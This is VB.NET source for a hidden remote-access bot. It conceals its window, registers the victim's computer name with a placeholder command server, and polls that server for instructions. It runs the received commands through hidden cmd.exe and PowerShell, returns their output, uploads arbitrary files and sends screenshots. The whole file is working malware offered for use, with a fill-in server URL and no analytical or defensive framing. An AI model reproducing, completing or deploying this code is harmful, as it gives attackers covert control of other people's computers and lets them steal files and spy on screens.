Imports System.Net
Imports System.IO
Imports System.Text

Imports System.Collections.ObjectModel
Imports System.Management.Automation
Imports System.Management.Automation.Runspaces

Public Class Form1

    'Server URL
    Dim server_url As String = "http://youwebsitehere_or_yourip"
    Dim pcname As String

    Function GetComputerName() As String
        Dim ComputerName As String
        ComputerName = System.Net.Dns.GetHostName
        Return ComputerName
    End Function

    Sub addBot()
        Try
            Using client As New WebClient
                ' Download the web page as a string.
                Dim link As String = server_url & "/badd.php?name=" & pcname
                Dim value As String = client.DownloadString(link)
            End Using
        Catch
            Console.WriteLine("ERROR: can't add the bot to the server list")
        End Try
    End Sub

    Sub UpdateStatus()
        Try
            Using client As New WebClient
                ' Download the web page as a string.
                Dim value As String = client.DownloadString(server_url + "/bstatus.php?name=" + pcname)
            End Using
        Catch
            Console.WriteLine("ERROR: can't update the bot status")
        End Try
    End Sub

    Function sendData(ByVal data As String) As Boolean
        data = data.Replace("<", "_")
        Try
            Using client As New WebClient
                Dim reqparm As New Specialized.NameValueCollection
                reqparm.Add("data", data)
                'client.DownloadString(server_url + "/breturn.php?name=" + pcname + "&func=set&data=" + data)
                Dim responsebytes = client.UploadValues(server_url + "/breturn.php?name=" + pcname + "&func=set", "POST", reqparm)
                Dim responsebody = (New System.Text.UTF8Encoding).GetString(responsebytes)
            End Using
        Catch
            Console.WriteLine("ERROR: can't send the data to the server")
            Return False
        End Try
        Return True
    End Function

    Function RunScript(ByVal scriptText As String) As String
        Try
            Dim myrunspace As RunSpace = RunspaceFactory.CreateRunspace()
            myrunspace.Open()
            Dim mypipeline As Pipeline = myrunspace.CreatePipeline()
            mypipeline.Commands.AddScript(scriptText)
            Dim results As Collection(Of PSObject) = mypipeline.Invoke()
            myrunspace.close()
            Dim mystringbuilder As New StringBuilder()
            For Each obj As PSObject In results
                mystringbuilder.AppendLine(obj.ToString())
            Next
            Return mystringbuilder.ToString()
        Catch
            Console.WriteLine("ERROR: can't run powershell script")
            Return ""
        End Try
    End Function

    Sub sendFile(ByVal filepath As String)
        Try
            Using client As New WebClient()
                Dim responseBinary As Byte()
                responseBinary = client.UploadFile(server_url + "/files.php?func=upload", filepath)
                Dim response As String
                response = Encoding.UTF8.GetString(responseBinary)
                Console.WriteLine(response)
            End Using
        Catch
            Console.WriteLine("ERROR: can't upload the file")
        End Try
    End Sub

    Sub sendScreenshot()
        Dim bounds As Rectangle
        Dim screenshot As System.Drawing.Bitmap
        Dim graph As Graphics
        bounds = Screen.PrimaryScreen.Bounds
        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppRgb)
        graph = Graphics.FromImage(screenshot)
        graph.CopyFromScreen(0, 0, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
        Dim uTime As Integer = (DateTime.UtcNow - New DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds
        Dim imgpath = Path.GetTempPath() + "\" + pcname + "_" + uTime.ToString() + ".jpg"
        Try
            screenshot.Save(imgpath, Imaging.ImageFormat.Jpeg)
            sendFile(imgpath)
            File.Delete(imgpath)
        Catch
            Console.WriteLine("ERROR: can't take or send the screenshot")
        End Try
    End Sub

    Function getCommand() As String
        Dim value As String = ""
        Try
            Using client As New WebClient
                ' Download the web page as a string.
                value = client.DownloadString(server_url + "/bcommand.php?name=" + pcname + "&func=get")
            End Using
        Catch
            Console.WriteLine("ERROR: can't get the command from the server")
        End Try
        Return value
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        'Make me invisible and get computer name
        Me.Visible = False
        pcname = GetComputerName()

        'Add bot to the server list
        addBot()

        'Start timers
        UpdateStatusTimer.Start()
        getCommands.Start()

    End Sub

    Private Sub UpdateStatusTimer_Tick(sender As Object, e As EventArgs) Handles UpdateStatusTimer.Tick
        UpdateStatus()
    End Sub

    Private Sub getCommands_Tick(sender As Object, e As EventArgs) Handles getCommands.Tick
        Dim command As String
        Dim cmdtype As String

        command = getCommand()

        If command <> "" Then
            cmdtype = command(0)
            command = command.Remove(0, 1)
            If cmdtype = "0" Then
                Dim process As New Process()
                Dim startInfo As New ProcessStartInfo("cmd.exe")
                startInfo.WindowStyle = ProcessWindowStyle.Minimized
                startInfo.WindowStyle = ProcessWindowStyle.Hidden
                startInfo.CreateNoWindow = True
                startInfo.UseShellExecute = False
                startInfo.RedirectStandardOutput = True
                startInfo.Arguments = "/C " + command
                process.StartInfo = startInfo
                process.Start()

                Dim sOutput As String
                Using oStreamReader As System.IO.StreamReader = process.StandardOutput
                    sOutput = oStreamReader.ReadToEnd()
                End Using
                sendData(sOutput)
            ElseIf cmdtype = "1" Then
                sendFile(command)
            ElseIf cmdtype = "2" Then
                sendScreenshot()
            ElseIf cmdtype = "3" Then
                Dim pshellout As String = RunScript(command)
                sendData(pshellout)
            End If
        End If
    End Sub

End Class
